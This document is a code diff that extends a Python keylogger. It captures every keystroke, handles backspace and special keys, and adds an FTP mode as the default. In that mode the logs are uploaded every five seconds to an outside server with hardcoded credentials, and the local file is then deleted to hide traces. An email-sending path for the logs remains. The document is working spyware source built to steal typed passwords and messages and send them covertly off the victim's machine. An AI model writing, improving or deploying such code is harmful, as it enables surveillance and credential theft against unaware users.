@@ -1,12 +1,18 @@
 import keyboard # for keylogs
 import smtplib # for sending emails using SMTP protocol (gmail)
+import ftplib
+import os
 
 from threading import Timer #Timer is used to make a method run after an interval of time
 from datetime import datetime
 
-SEND_REPORT_EVERY = 60 
+SEND_REPORT_EVERY = 5
 EMAIL_ADDRESS = "email"
 EMAIL_PASSWORD = "password"
+# FTP server credentials
+FTP_HOST = "ftp.dlptest.com"
+FTP_USER = "dlpuser"
+FTP_PASS = "rNrKYTX9g7z3RgJRmxWuGHbeu"
 
 class Keylogger:
     
@@ -22,24 +28,23 @@ class Keylogger:
 
     def callback(self, event):
         #This callback is invoked whenever a keyboard event occurs
-        name = event.name
-        if len(name) > 1:
-            #not a character, AKA a special key
-            if name == "space":
-                #instead of "space"
-                name == " "
-            elif name == "enter":
-                #adds a new line whenever enter is pressed
-                name == "[ENTER]\n"
-            elif name == "decimal":
-                name = "."
-            else:
-                #replace spaces with underscores?
-                name = name.replace(" ", "_")
-                name = f"[{name.upper()}]" #not sure what this does
-        #finally, add the key name to the global 'self.log' variable
+        name = event.name 
+        
+        if name == "space":
+            name = " "
+        elif name == "shift":
+            name = ""
+        elif name == "enter":
+            name = "[ENTER]\n"
+        elif name == "backspace":
+            name = ""
+            self.log = self.log[:-1]
+        elif name == "ctrl":
+            name = "[CTRL]"
+        elif name == "None":
+            print ("No keystrokes captured.")
         self.log += name #whenever a key is pressed the character is appended to the self.log string
-    
+        
     def update_filename(self): #report the keylog to a local file
         #construct the filename to be identified by start and end times
         start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
@@ -52,6 +57,30 @@ class Keylogger:
             #write the keylogs to the file
             print(self.log, file=f)
         print(f"[+] Saved {self.filename}.txt")
+    
+    def ftp(self):
+        with open(f"{self.filename}.txt", "w") as f:
+            #write the keylogs to the file
+            print(self.log, file=f)
+        print(f"[+] Saved {self.filename}.txt")
+
+        # connect to the FTP server
+        ftp = ftplib.FTP(FTP_HOST, FTP_USER, FTP_PASS)
+        # force UTF-8 encoding
+        ftp.encoding = "utf-8"
+        # local file name you want to upload
+        filename = (f"{self.filename}.txt")
+        with open(filename, "rb") as file:
+            # use FTP's STOR command to upload the file
+            ftp.storbinary(f"STOR {filename}", file)
+        # list current files & directories
+        ftp.dir()
+        # quit and close the connection
+        ftp.quit()
+
+        #DELETE THE FILE THAT WAS CREATED
+        cwd = os.getcwd()
+        os.remove(cwd + '\\' + self.filename + '.txt')
 
     def sendmail(self, email, password, message): #sending the file through email
         #manages connection to the SMTP server
@@ -79,6 +108,9 @@ class Keylogger:
                 self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
             elif self.report_method == "file":
                 self.report_to_file()
+            elif self.report_method == "ftp":
+                self.ftp()
+            
             print(f"[{self.filename}] - {self.log}")
             self.start_dt = datetime.now()
         self.log = ""
@@ -99,8 +131,15 @@ class Keylogger:
         keyboard.wait()
 
 if __name__ == "__main__":
-    #if you want keylogger to send to your email, uncomment below
-    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
-    #if you want keylogger to record keylogs to a local file, uncomment below
-    """keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")"""
+
+    """if you want keylogger to send to your email, uncomment below"""
+    #keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
+
+    """if you want keylogger to record keylogs to a local file, uncomment below"""
+    #keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
+
+    """if you want keylogger to send the file to an ftp server, uncomment below."""
+    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="ftp")
+
     keylogger.start()
+
